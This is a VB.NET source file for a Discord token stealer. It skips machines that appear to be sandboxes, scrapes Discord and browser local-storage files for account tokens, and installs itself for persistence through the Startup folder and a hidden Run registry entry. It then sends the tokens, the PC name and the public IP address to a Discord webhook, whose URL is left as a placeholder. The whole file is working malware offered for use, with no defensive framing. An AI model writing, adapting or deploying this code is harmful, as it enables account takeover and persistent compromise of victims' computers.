Imports Microsoft.Win32
Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading

Namespace Grab
	Public Class Program
		Public Shared Sub Main(ByVal args() As String)
			If (New System.Management.ManagementObjectSearcher("SELECT * FROM Win32_PortConnector")).Get().Count = 0 Then
				Return
			End If

			Dim webhook = "URL WEbhock"
			Dim webhookName = "MONSTERMC"
			Dim webhookImage = "https://i.ibb.co/fps45hd/steampfp.jpg"

			Dim pcName = Environment.UserName
			copy2startup()
			Dim APPDATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
			Dim LOCAL = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
			Dim list = New List(Of String)()

			' im just copy paste from my java grabber LMAO
			list.Add(APPDATA & "\Discord\Local Storage\leveldb\")
			list.Add(APPDATA & "\discordcanary\Local Storage\leveldb\")
			list.Add(APPDATA & "\discordptb\Local Storage\leveldb\")
			list.Add(APPDATA & "\discorddevelopment\Local Storage\leveldb\")
			list.Add(APPDATA & "\Lightcord\Local Storage\leveldb\")

			list.Add(LOCAL & "\Google\Chrome\User Data\Default\Local Storage\leveldb\")
			list.Add(LOCAL & "\Google\Chrome SxS\User Data\Local Storage\leveldb\")
			list.Add(LOCAL & "\Yandex\YandexBrowser\User Data\Default")
			list.Add(LOCAL & "\Microsoft\Edge\User Data\Default\Local Storage\leveldb\")
			list.Add(LOCAL & "\BraveSoftware\Brave-Browser\User Data\Default")
			list.Add(APPDATA & "\Opera Software\Opera Stable\Local Storage\leveldb\")
			list.Add(APPDATA & "\Opera Software\Opera GX Stable\Local Storage\leveldb\")
			list.Add(LOCAL & "\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb\")

			Dim token = New List(Of String)()
			For Each path In list
				If Not Directory.Exists(path) Then
					Continue For
				End If

				Dim filelist = New DirectoryInfo(path)
				For Each file In filelist.GetFiles()
					If file.Equals("LOCK") Then
						Continue For
					End If
					Try
						Dim data = file.OpenText().ReadToEnd()
						For Each match As Match In Regex.Matches(data, "[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|mfa\.[\w-]{84}")
							If token.Contains(match.Value) Then
								Continue For
							End If
							Dim info = TokenUtil.checkToken(match.Value)
							If info.vaild Then
								' add "info.username" will make 400 code when send webhook idk why who know make a issue or pr
								token.Add(info.token) ' + " (" + info.username + ")"
							End If
						Next match

					Catch e1 As Exception
					End Try
				Next file
			Next path

			Dim result_token = String.Join("\n", token.ToArray())
			If String.IsNullOrEmpty(result_token) Then
				result_token = "no token :c"
			End If

			' super lazy unicode remover
			'result_token = Regex.Replace(result_token, "(\\\\u....)", String.Empty);

			Dim client = New WebClient()
			client.Headers.Add("content-type", "application/json")
			client.Headers.Add("User-Agent", "kath")
			client.UploadData(webhook, "POST", Encoding.UTF8.GetBytes("{""tts"":false,""avatar_url"":""%pfp_url%"",""embeds"":[{""color"":65280,""footer"":{""icon_url"":""%pfp_url%"",""text"":""%footer%""},""title"":""Token Found C#"",""fields"":[{""inline"":true,""name"":""Ip:"",""value"":""%ip%""},{""inline"":true,""name"":""Pc Name:"",""value"":""%pc_name%""},{""inline"":false,""name"":""Token:"",""value"":""```\n%token%\n```""}]}],""content"":"""",""username"":""%bot_name%""}".Replace("%pfp_url%", webhookImage).Replace("%footer%", Date.Now.DayOfWeek.ToString() & " | " & Date.Now.ToString("yyyy-MM-dd HH:mm:ss")).Replace("%ip%", getIp()).Replace("%pc_name%", pcName).Replace("%token%", result_token).Replace("%bot_name%", webhookName)))
		End Sub

		Public Shared Sub copy2startup()
			' yay this new thread it work on c# too
			CType(New Thread(Sub()
				'Runtime.execSync("regedit.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Loader /t REG_SZ /d \"" + Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%") + "\\loader.exe" + "\"");
				' ^^ lmao pro c# gamer will mad at me im sure xd
				Try
					Dim startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & "5cd5-11ec-bf63-0242.exe"
					If Not File.Exists(startup) Then
						File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, startup)
					End If
				Catch e1 As Exception
				End Try
				Try
					Dim path = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%") & "\loader.exe"
					If Not File.Exists(path) Then
						File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, path)
					End If
				Catch e2 As Exception
				End Try
				Dim regKey = Registry.CurrentUser.OpenSubKey("Software", True).OpenSubKey("Microsoft", True).OpenSubKey("Windows", True).OpenSubKey("CurrentVersion", True).OpenSubKey("Run", True)
				regKey.SetValue("Init Loader", Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%") & "\loader.exe")
				File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "/" & "5cd5-11ec-bf63-0242.exe", FileAttributes.Hidden Or FileAttributes.System)
				File.SetAttributes(Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%") & "\loader.exe", FileAttributes.Hidden Or FileAttributes.System)
			End Sub), Thread).Start()
		End Sub

'''        
'''         * bro how tf do i use json in c#????????
'''         * so just copy from java lol
'''         
		Public Shared Function getJsonKey(ByVal hson As String, ByVal key As String) As String
			Try
				Return Regex.Match(hson, """" & key & """: "".*""").Value.Split(""""c)(3)
			Catch e1 As Exception
				Return Nothing
			End Try
		End Function

		Public Shared Function getIp() As String
			Try
				Return (New WebClient()).DownloadString("http://api.ipify.org")
			Catch e As Exception
				Return "err> " & e.Message
			End Try
		End Function
	End Class
End Namespace
